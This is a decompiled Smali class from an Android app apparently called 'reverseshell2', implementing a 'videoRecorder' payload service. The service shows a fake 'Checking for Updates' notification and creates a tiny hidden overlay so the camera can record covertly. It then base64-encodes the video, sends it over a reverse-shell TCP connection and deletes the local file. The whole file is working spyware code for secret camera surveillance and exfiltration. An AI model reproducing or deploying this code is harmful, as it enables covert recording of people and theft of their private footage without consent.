.class public Lcom/example/reverseshell2/Payloads/videoRecorder;
.super Landroid/app/Service;
.source "videoRecorder.java"


# static fields
.field static TAG:Ljava/lang/String;


# instance fields
.field private camera:Landroid/hardware/Camera;

.field private mediaRecorder:Landroid/media/MediaRecorder;

.field private surfaceView:Landroid/view/SurfaceView;

.field videoFile:Ljava/io/File;

.field private windowManager:Landroid/view/WindowManager;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    const-string v0, "videoRecoderClass"

    sput-object v0, Lcom/example/reverseshell2/Payloads/videoRecorder;->TAG:Ljava/lang/String;

    return-void
.end method

.method public constructor <init>()V
    .locals 1

    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    const/4 v0, 0x0

    iput-object v0, p0, Lcom/example/reverseshell2/Payloads/videoRecorder;->camera:Landroid/hardware/Camera;

    iput-object v0, p0, Lcom/example/reverseshell2/Payloads/videoRecorder;->mediaRecorder:Landroid/media/MediaRecorder;

    return-void
.end method

.method static synthetic access$000(Lcom/example/reverseshell2/Payloads/videoRecorder;)Landroid/hardware/Camera;
    .locals 1

    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/videoRecorder;->camera:Landroid/hardware/Camera;

    return-object v0
.end method

.method static synthetic access$002(Lcom/example/reverseshell2/Payloads/videoRecorder;Landroid/hardware/Camera;)Landroid/hardware/Camera;
    .locals 0

    iput-object p1, p0, Lcom/example/reverseshell2/Payloads/videoRecorder;->camera:Landroid/hardware/Camera;

    return-object p1
.end method

.method static synthetic access$100(Lcom/example/reverseshell2/Payloads/videoRecorder;)Landroid/media/MediaRecorder;
    .locals 1

    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/videoRecorder;->mediaRecorder:Landroid/media/MediaRecorder;

    return-object v0
.end method

.method static synthetic access$102(Lcom/example/reverseshell2/Payloads/videoRecorder;Landroid/media/MediaRecorder;)Landroid/media/MediaRecorder;
    .locals 0

    iput-object p1, p0, Lcom/example/reverseshell2/Payloads/videoRecorder;->mediaRecorder:Landroid/media/MediaRecorder;

    return-object p1
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1

    const/4 v0, 0x0

    return-object v0
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 6

    const-string v0, "ins"

    invoke-virtual {p1, v0}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "startFore"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    const/4 v2, 0x1

    if-eqz v1, :cond_0

    new-instance v1, Lcom/example/reverseshell2/functions;

    const/4 v3, 0x0

    invoke-direct {v1, v3}, Lcom/example/reverseshell2/functions;-><init>(Landroid/app/Activity;)V

    invoke-virtual {p0}, Lcom/example/reverseshell2/Payloads/videoRecorder;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    invoke-virtual {v1, v3}, Lcom/example/reverseshell2/functions;->createNotiChannel(Landroid/content/Context;)V

    new-instance v1, Landroidx/core/app/NotificationCompat$Builder;

    invoke-virtual {p0}, Lcom/example/reverseshell2/Payloads/videoRecorder;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    const-string v4, "channelid"

    invoke-direct {v1, v3, v4}, Landroidx/core/app/NotificationCompat$Builder;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    const-string v3, "Checking for Updates"

    invoke-virtual {v1, v3}, Landroidx/core/app/NotificationCompat$Builder;->setContentTitle(Ljava/lang/CharSequence;)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v1

    const-string v3, "Fetching"

    invoke-virtual {v1, v3}, Landroidx/core/app/NotificationCompat$Builder;->setContentText(Ljava/lang/CharSequence;)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v1

    const v3, 0x7f060056

    invoke-virtual {v1, v3}, Landroidx/core/app/NotificationCompat$Builder;->setSmallIcon(I)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v1

    const/4 v3, 0x0

    invoke-virtual {v1, v3, v3, v2}, Landroidx/core/app/NotificationCompat$Builder;->setProgress(IIZ)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v1

    invoke-virtual {v1}, Landroidx/core/app/NotificationCompat$Builder;->build()Landroid/app/Notification;

    move-result-object v1

    const/16 v3, 0x4d2

    invoke-virtual {p0, v3, v1}, Lcom/example/reverseshell2/Payloads/videoRecorder;->startForeground(ILandroid/app/Notification;)V

    const-string v3, "cameraid"

    invoke-virtual {p1, v3}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v4

    sget-object v5, Lcom/example/reverseshell2/tcpConnection;->out:Ljava/io/OutputStream;

    invoke-virtual {p0, v4, v5}, Lcom/example/reverseshell2/Payloads/videoRecorder;->startVideo(ILjava/io/OutputStream;)V

    :cond_0
    const-string v1, "stopFore"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_1

    sget-object v1, Lcom/example/reverseshell2/tcpConnection;->out:Ljava/io/OutputStream;

    invoke-virtual {p0, v1}, Lcom/example/reverseshell2/Payloads/videoRecorder;->videoStop(Ljava/io/OutputStream;)V

    :cond_1
    return v2
.end method

.method public sendData(Ljava/io/File;Ljava/io/OutputStream;)V
    .locals 6

    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/example/reverseshell2/Payloads/videoRecorder$5;

    invoke-direct {v1, p0, p2}, Lcom/example/reverseshell2/Payloads/videoRecorder$5;-><init>(Lcom/example/reverseshell2/Payloads/videoRecorder;Ljava/io/OutputStream;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    invoke-virtual {p1}, Ljava/io/File;->length()J

    move-result-wide v0

    long-to-int v1, v0

    new-array v0, v1, [B

    :try_start_0
    new-instance v2, Ljava/io/BufferedInputStream;

    new-instance v3, Ljava/io/FileInputStream;

    invoke-direct {v3, p1}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V

    invoke-direct {v2, v3}, Ljava/io/BufferedInputStream;-><init>(Ljava/io/InputStream;)V

    array-length v3, v0

    const/4 v4, 0x0

    invoke-virtual {v2, v0, v4, v3}, Ljava/io/BufferedInputStream;->read([BII)I

    sget-object v3, Lcom/example/reverseshell2/Payloads/videoRecorder;->TAG:Ljava/lang/String;

    invoke-static {v1}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v5

    invoke-static {v3, v5}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    invoke-static {v0, v4}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object v3

    new-instance v4, Ljava/lang/Thread;

    new-instance v5, Lcom/example/reverseshell2/Payloads/videoRecorder$6;

    invoke-direct {v5, p0, p2, v3}, Lcom/example/reverseshell2/Payloads/videoRecorder$6;-><init>(Lcom/example/reverseshell2/Payloads/videoRecorder;Ljava/io/OutputStream;Ljava/lang/String;)V

    invoke-direct {v4, v5}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v4}, Ljava/lang/Thread;->start()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v2

    :goto_0
    return-void
.end method

.method public startVideo(ILjava/io/OutputStream;)V
    .locals 9

    invoke-virtual {p0}, Lcom/example/reverseshell2/Payloads/videoRecorder;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/Context;->getCacheDir()Ljava/io/File;

    move-result-object v0

    :try_start_0
    const-string v1, "sound"

    const-string v2, ".mp4"

    invoke-static {v1, v2, v0}, Ljava/io/File;->createTempFile(Ljava/lang/String;Ljava/lang/String;Ljava/io/File;)Ljava/io/File;

    move-result-object v1

    iput-object v1, p0, Lcom/example/reverseshell2/Payloads/videoRecorder;->videoFile:Ljava/io/File;
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v1

    invoke-virtual {v1}, Ljava/io/IOException;->printStackTrace()V

    :goto_0
    const-string v1, "window"

    invoke-virtual {p0, v1}, Lcom/example/reverseshell2/Payloads/videoRecorder;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/view/WindowManager;

    iput-object v1, p0, Lcom/example/reverseshell2/Payloads/videoRecorder;->windowManager:Landroid/view/WindowManager;

    new-instance v1, Landroid/view/SurfaceView;

    invoke-virtual {p0}, Lcom/example/reverseshell2/Payloads/videoRecorder;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    invoke-direct {v1, v2}, Landroid/view/SurfaceView;-><init>(Landroid/content/Context;)V

    iput-object v1, p0, Lcom/example/reverseshell2/Payloads/videoRecorder;->surfaceView:Landroid/view/SurfaceView;

    new-instance v1, Landroid/view/WindowManager$LayoutParams;

    const/4 v4, 0x1

    const/4 v5, 0x1

    const/16 v6, 0x7d5

    const/high16 v7, 0x40000

    const/4 v8, -0x3

    move-object v3, v1

    invoke-direct/range {v3 .. v8}, Landroid/view/WindowManager$LayoutParams;-><init>(IIIII)V

    const/16 v2, 0x33

    iput v2, v1, Landroid/view/WindowManager$LayoutParams;->gravity:I

    iget-object v2, p0, Lcom/example/reverseshell2/Payloads/videoRecorder;->windowManager:Landroid/view/WindowManager;

    iget-object v3, p0, Lcom/example/reverseshell2/Payloads/videoRecorder;->surfaceView:Landroid/view/SurfaceView;

    invoke-interface {v2, v3, v1}, Landroid/view/WindowManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    iget-object v2, p0, Lcom/example/reverseshell2/Payloads/videoRecorder;->surfaceView:Landroid/view/SurfaceView;

    invoke-virtual {v2}, Landroid/view/SurfaceView;->getHolder()Landroid/view/SurfaceHolder;

    move-result-object v2

    new-instance v3, Lcom/example/reverseshell2/Payloads/videoRecorder$1;

    invoke-direct {v3, p0, p1, p2}, Lcom/example/reverseshell2/Payloads/videoRecorder$1;-><init>(Lcom/example/reverseshell2/Payloads/videoRecorder;ILjava/io/OutputStream;)V

    invoke-interface {v2, v3}, Landroid/view/SurfaceHolder;->addCallback(Landroid/view/SurfaceHolder$Callback;)V

    return-void
.end method

.method public videoStop(Ljava/io/OutputStream;)V
    .locals 5

    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/videoRecorder;->mediaRecorder:Landroid/media/MediaRecorder;

    if-eqz v0, :cond_1

    :try_start_0
    invoke-virtual {v0}, Landroid/media/MediaRecorder;->stop()V
    :try_end_0
    .catch Ljava/lang/IllegalStateException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    new-instance v1, Ljava/lang/Thread;

    new-instance v2, Lcom/example/reverseshell2/Payloads/videoRecorder$2;

    invoke-direct {v2, p0, p1}, Lcom/example/reverseshell2/Payloads/videoRecorder$2;-><init>(Lcom/example/reverseshell2/Payloads/videoRecorder;Ljava/io/OutputStream;)V

    invoke-direct {v1, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v1}, Ljava/lang/Thread;->start()V

    :goto_0
    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/videoRecorder;->mediaRecorder:Landroid/media/MediaRecorder;

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->reset()V

    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/videoRecorder;->mediaRecorder:Landroid/media/MediaRecorder;

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->release()V

    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/videoRecorder;->camera:Landroid/hardware/Camera;

    invoke-virtual {v0}, Landroid/hardware/Camera;->lock()V

    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/videoRecorder;->camera:Landroid/hardware/Camera;

    invoke-virtual {v0}, Landroid/hardware/Camera;->release()V

    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/videoRecorder;->windowManager:Landroid/view/WindowManager;

    iget-object v1, p0, Lcom/example/reverseshell2/Payloads/videoRecorder;->surfaceView:Landroid/view/SurfaceView;

    invoke-interface {v0, v1}, Landroid/view/WindowManager;->removeView(Landroid/view/View;)V

    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/videoRecorder;->videoFile:Ljava/io/File;

    invoke-virtual {v0}, Ljava/io/File;->length()J

    move-result-wide v0

    const-wide/16 v2, 0x0

    cmp-long v4, v0, v2

    if-eqz v4, :cond_0

    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/videoRecorder;->videoFile:Ljava/io/File;

    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result v0

    if-eqz v0, :cond_0

    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/videoRecorder;->videoFile:Ljava/io/File;

    invoke-virtual {p0, v0, p1}, Lcom/example/reverseshell2/Payloads/videoRecorder;->sendData(Ljava/io/File;Ljava/io/OutputStream;)V

    goto :goto_1

    :cond_0
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/example/reverseshell2/Payloads/videoRecorder$3;

    invoke-direct {v1, p0, p1}, Lcom/example/reverseshell2/Payloads/videoRecorder$3;-><init>(Lcom/example/reverseshell2/Payloads/videoRecorder;Ljava/io/OutputStream;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    :goto_1
    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/videoRecorder;->videoFile:Ljava/io/File;

    invoke-virtual {v0}, Ljava/io/File;->delete()Z

    goto :goto_2

    :cond_1
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/example/reverseshell2/Payloads/videoRecorder$4;

    invoke-direct {v1, p0, p1}, Lcom/example/reverseshell2/Payloads/videoRecorder$4;-><init>(Lcom/example/reverseshell2/Payloads/videoRecorder;Ljava/io/OutputStream;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    :goto_2
    return-void
.end method
